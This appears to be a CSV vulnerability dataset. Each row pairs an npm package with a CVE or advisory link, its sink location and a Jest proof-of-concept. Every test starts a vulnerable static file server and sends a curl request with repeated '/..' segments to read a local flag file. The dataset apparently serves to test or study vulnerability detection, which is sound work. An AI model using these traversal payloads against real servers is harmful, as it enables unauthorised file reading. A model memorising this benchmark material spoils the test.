Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
path-traversal,CVE-2017-16191,cypserver,1.0.0,n/a,path-traversal/cypserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cypserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/cypserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:10:8,https://security.snyk.io/vuln/npm:cypserver:20170617; https://github.com/advisories/GHSA-m69q-pmxg-vqch
path-traversal,CVE-2019-5480,statichttpserver,0.9.7,n/a,path-traversal/statichttpserver_0.9.7,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in statichttpserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/statichttpserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/middleware/respond.js:28:7,https://security.snyk.io/vuln/SNYK-JS-STATICHTTPSERVER-460284; https://github.com/advisories/GHSA-2j5x-56p6-hj6x
path-traversal,,web-node-server,0.1.0,0.0.11,path-traversal/web-node-server_0.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8981/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in web-node-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8981/tcp"", () => {});
  } catch (e) {}
  let config = {
    localhost: {
      backend: __dirname + ""/"",
      frondend: __dirname + ""/"",
      baseTemp: ""index.html"",
    },
  };
  const pkg = require(""web-node-server"");
  pkg.start(config);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9999${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,nodeserver.js:85:16,https://security.snyk.io/vuln/npm:web-node-server:20180306; 
path-traversal,,ex-http-frame,1.0.2,n/a,path-traversal/ex-http-frame_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ex-http-frame"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ex-http-frame/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/res.js:41:37,https://security.snyk.io/vuln/npm:ex-http-frame:20180226; 
path-traversal,CVE-2017-16102,serverhuwenhui,1.1.0,n/a,path-traversal/serverhuwenhui_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 55555/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverhuwenhui"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 55555/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverhuwenhui/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:55555${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:5:8,https://security.snyk.io/vuln/npm:serverhuwenhui:20170516; https://github.com/advisories/GHSA-rx32-c25r-79mx
path-traversal,,yxxserver,1.0.0,n/a,path-traversal/yxxserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yxxserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yxxserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:yxxserver:20180306; 
path-traversal,CVE-2017-16105,serverwzl,1.3.1,n/a,path-traversal/serverwzl_1.3.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverwzl"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverwzl/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:serverwzl:20170511; https://github.com/advisories/GHSA-g87g-4x3w-f8jp
path-traversal,CVE-2017-16155,fast-http-cli,0.0.8,n/a,path-traversal/fast-http-cli_0.0.8,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8892/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fast-http-cli"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8892/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fast-http-cli/fast-http.js -p 8892"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8892${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:35:16,https://security.snyk.io/vuln/npm:fast-http-cli:20170418; https://github.com/advisories/GHSA-9frq-f867-hgqc
path-traversal,CVE-2017-16142,infraserver,0.0.1,n/a,path-traversal/infraserver_0.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 46372/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in infraserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 46372/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/infraserver/Infra.data.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:46372${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,Infra.data.js:137:9,https://security.snyk.io/vuln/npm:infraserver:20170518; https://github.com/advisories/GHSA-v464-rcx7-j875
path-traversal,,xxf11,1.0.1,n/a,path-traversal/xxf11_1.0.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8890/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in xxf11"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8890/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/xxf11/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8890${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:8:8,https://security.snyk.io/vuln/npm:xxf11:20170730; 
path-traversal,,express-blinker,0.0.6,n/a,path-traversal/express-blinker_0.0.6,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in express-blinker"", (done) => {
  expect.assertions(1);
  const express = require(""express"");
  let app = express();
  const pkg = require(""express-blinker"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8893/tcp"", () => {});
  } catch (e) {}
  app.use(
    pkg(__dirname, [
      {
        test: /.*/,
        etag: true,
        lastModified: false,
        cacheControl: true,
        expires: false,
        age: 600,
      },
    ])
  );
  app.listen(8893);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8893${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:181:28,https://security.snyk.io/vuln/npm:express-blinker:20180226; 
path-traversal,,gyfserver,1.0.0,n/a,path-traversal/gyfserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in gyfserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/gyfserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:gyfserver:20180315; 
path-traversal,,run-this-place,1.0.2,n/a,path-traversal/run-this-place_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in run-this-place"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/run-this-place/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:53:37,https://security.snyk.io/vuln/npm:run-this-place:20170508; 
path-traversal,CVE-2017-16212,ltt,1.1.0,n/a,path-traversal/ltt_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ltt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ltt/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:7:8,https://security.snyk.io/vuln/npm:ltt:20170503; https://github.com/advisories/GHSA-5jg5-w395-9684
